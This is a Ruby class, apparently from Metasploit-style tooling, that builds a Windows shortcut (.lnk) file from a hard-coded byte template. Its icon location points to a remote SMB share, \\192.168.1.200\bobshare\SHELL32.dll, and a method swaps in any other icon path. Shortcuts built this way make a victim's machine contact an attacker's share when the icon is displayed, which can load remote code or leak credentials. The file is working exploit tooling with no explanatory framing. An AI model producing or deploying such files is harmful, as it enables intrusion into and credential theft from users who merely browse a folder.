$VERBOSE = nil

require 'rex'

$VERBOSE = false

class LNK

	attr_accessor :template, :icon_path

	def initialize(icon_path=nil)

		@icon_path = icon_path
		@template =  "\x4C\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00"+
			"\x00\x00\x00\x46\xDB\x00\x08\x00\x20\x00\x00\x00\x5F\x6A\x78\xA3"+
			"\x15\x04\xCA\x01\x5F\x6A\x78\xA3\x15\x04\xCA\x01\x90\x65\xFA\xDA"+
			"\x23\x04\xCA\x01\x00\x04\x0E\x00\x46\x00\x00\x00\x01\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2D\x01\x14\x00"+
			"\x1F\x50\xE0\x4F\xD0\x20\xEA\x3A\x69\x10\xA2\xD8\x08\x00\x2B\x30"+
			"\x30\x9D\x19\x00\x2F\x43\x3A\x5C\x00\x00\x00\x00\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x52\x00\x31\x00\x00"+
			"\x00\x00\x00\x6C\x49\x4D\x93\x10\x00\x57\x69\x6E\x64\x6F\x77\x73"+
			"\x00\x3C\x00\x08\x00\x04\x00\xEF\xBE\xEE\x3A\x85\x1A\x6C\x49\x4D"+
			"\x93\x2A\x00\x00\x00\x80\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6E"+
			"\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x00\x00\x16\x00\x56\x00\x31"+
			"\x00\x00\x00\x00\x00\x6C\x49\xE6\x94\x10\x00\x53\x79\x73\x74\x65"+
			"\x6D\x33\x32\x00\x00\x3E\x00\x08\x00\x04\x00\xEF\xBE\xEE\x3A\x86"+
			"\x1A\x6C\x49\xE6\x94\x2A\x00\x00\x00\x7C\x08\x00\x00\x00\x00\x01"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x53"+
			"\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6D\x00\x33\x00\x32\x00\x00"+
			"\x00\x18\x00\x56\x00\x32\x00\x00\x04\x0E\x00\xEE\x3A\xDD\x0C\x20"+
			"\x00\x63\x61\x6C\x63\x2E\x65\x78\x65\x00\x00\x3E\x00\x08\x00\x04"+
			"\x00\xEF\xBE\xED\x3A\x26\xBF\xED\x3A\x26\xBF\x2A\x00\x00\x00\x57"+
			"\x71\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x63\x00\x61\x00\x6C\x00\x63\x00\x2E\x00\x65"+
			"\x00\x78\x00\x65\x00\x00\x00\x18\x00\x00\x00\x4B\x00\x00\x00\x1C"+
			"\x00\x00\x00\x01\x00\x00\x00\x1C\x00\x00\x00\x2D\x00\x00\x00\x00"+
			"\x00\x00\x00\x4A\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\xFC"+
			"\x05\xBB\x24\x10\x00\x00\x00\x00\x43\x3A\x5C\x57\x69\x6E\x64\x6F"+
			"\x77\x73\x5C\x53\x79\x73\x74\x65\x6D\x33\x32\x5C\x63\x61\x6C\x63"+
			"\x2E\x65\x78\x65\x00\x00\x1C\x00\x2E\x00\x2E\x00\x5C\x00\x57\x00"+
			"\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x5C\x00\x53\x00"+
			"\x79\x00\x73\x00\x74\x00\x65\x00\x6D\x00\x33\x00\x32\x00\x5C\x00"+
			"\x63\x00\x61\x00\x6C\x00\x63\x00\x2E\x00\x65\x00\x78\x00\x65\x00"+
			"\x13\x00\x43\x00\x3A\x00\x5C\x00\x57\x00\x69\x00\x6E\x00\x64\x00"+
			"\x6F\x00\x77\x00\x73\x00\x5C\x00\x53\x00\x79\x00\x73\x00\x74\x00"+
			"\x65\x00\x6D\x00\x33\x00\x32\x00\x24\x00\x5C\x00\x5C\x00\x31\x00"+
			"\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00\x38\x00\x2E\x00\x31\x00"+
			"\x2E\x00\x32\x00\x30\x00\x30\x00\x5C\x00\x62\x00\x6F\x00\x62\x00"+
			"\x73\x00\x68\x00\x61\x00\x72\x00\x65\x00\x5C\x00\x53\x00\x48\x00"+
			"\x45\x00\x4C\x00\x4C\x00\x33\x00\x32\x00\x2E\x00\x64\x00\x6C\x00"+
			"\x6C\x00\x10\x00\x00\x00\x05\x00\x00\xA0\x25\x00\x00\x00\xD5\x00"+
			"\x00\x00\x1C\x00\x00\x00\x0B\x00\x00\xA0\x77\x4E\xC1\x1A\xE7\x02"+
			"\x5D\x4E\xB7\x44\x2E\xB1\xAE\x51\x98\xB7\xD5\x00\x00\x00\x00\x02"+
			"\x00\x00\x09\x00\x00\xA0\xA9\x00\x00\x00\x31\x53\x50\x53\x30\xF1"+
			"\x25\xB7\xEF\x47\x1A\x10\xA5\xF1\x02\x60\x8C\x9E\xEB\xAC\x25\x00"+
			"\x00\x00\x0A\x00\x00\x00\x00\x1F\x00\x00\x00\x09\x00\x00\x00\x63"+
			"\x00\x61\x00\x6C\x00\x63\x00\x2E\x00\x65\x00\x78\x00\x65\x00\x00"+
			"\x00\x00\x00\x29\x00\x00\x00\x04\x00\x00\x00\x00\x1F\x00\x00\x00"+
			"\x0C\x00\x00\x00\x41\x00\x70\x00\x70\x00\x6C\x00\x69\x00\x63\x00"+
			"\x61\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x00\x00\x15\x00\x00\x00"+
			"\x0F\x00\x00\x00\x00\x40\x00\x00\x00\x00\xFC\xA7\xA3\x15\x04\xCA"+
			"\x01\x15\x00\x00\x00\x0C\x00\x00\x00\x00\x15\x00\x00\x00\x00\x04"+
			"\x0E\x00\x00\x00\x00\x00\x15\x00\x00\x00\x0E\x00\x00\x00\x00\x40"+
			"\x00\x00\x00\x00\xA5\x1D\xDB\x23\x04\xCA\x01\x00\x00\x00\x00\x89"+
			"\x00\x00\x00\x31\x53\x50\x53\xE2\x8A\x58\x46\xBC\x4C\x38\x43\xBB"+
			"\xFC\x13\x93\x26\x98\x6D\xCE\x6D\x00\x00\x00\x04\x00\x00\x00\x00"+
			"\x1F\x00\x00\x00\x2E\x00\x00\x00\x53\x00\x2D\x00\x31\x00\x2D\x00"+
			"\x35\x00\x2D\x00\x32\x00\x31\x00\x2D\x00\x33\x00\x35\x00\x38\x00"+
			"\x33\x00\x39\x00\x31\x00\x31\x00\x32\x00\x33\x00\x33\x00\x2D\x00"+
			"\x32\x00\x32\x00\x38\x00\x38\x00\x32\x00\x37\x00\x34\x00\x30\x00"+
			"\x34\x00\x31\x00\x2D\x00\x33\x00\x38\x00\x36\x00\x38\x00\x37\x00"+
			"\x31\x00\x32\x00\x38\x00\x35\x00\x36\x00\x2D\x00\x35\x00\x30\x00"+
			"\x30\x00\x00\x00\x00\x00\x00\x00\x59\x00\x00\x00\x31\x53\x50\x53"+
			"\xED\x30\xBD\xDA\x43\x00\x89\x47\xA7\xF8\xD0\x13\xA4\x73\x66\x22"+
			"\x3D\x00\x00\x00\x64\x00\x00\x00\x00\x1F\x00\x00\x00\x16\x00\x00"+
			"\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6D\x00\x33\x00\x32"+
			"\x00\x20\x00\x28\x00\x43\x00\x3A\x00\x5C\x00\x57\x00\x69\x00\x6E"+
			"\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x29\x00\x00\x00\x00\x00\x00"+
			"\x00\x69\x00\x00\x00\x31\x53\x50\x53\xA6\x6A\x63\x28\x3D\x95\xD2"+
			"\x11\xB5\xD6\x00\xC0\x4F\xD9\x18\xD0\x4D\x00\x00\x00\x1E\x00\x00"+
			"\x00\x00\x1F\x00\x00\x00\x1D\x00\x00\x00\x43\x00\x3A\x00\x5C\x00"+
			"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x5C\x00"+
			"\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6D\x00\x33\x00\x32\x00"+
			"\x5C\x00\x63\x00\x61\x00\x6C\x00\x63\x00\x2E\x00\x65\x00\x78\x00"+
			"\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x00"+
			"\x00\x00\x03\x00\x00\xA0\x58\x00\x00\x00\x00\x00\x00\x00\x64\x63"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x0C"+
			"\xC7\x63\x63\x44\x06\x44\x8F\x81\x36\x8B\x57\x66\x1E\x9C\xE4\xEF"+
			"\xB6\xCC\x1F\xA9\xE6\x11\xB2\x43\x08\x00\x27\x0A\xD8\x4C\xF0\x0C"+
			"\xC7\x63\x63\x44\x06\x44\x8F\x81\x36\x8B\x57\x66\x1E\x9C\xE4\xEF"+
			"\xB6\xCC\x1F\xA9\xE6\x11\xB2\x43\x08\x00\x27\x0A\xD8\x4C\x00\x00"+
			"\x00\x00"

	end

	def update_icon_path(path)
		path = Rex::Text::to_unicode(path)
		@template.slice!(0x0229..0x0270)
		@template.insert(0x0229, path)
	end

end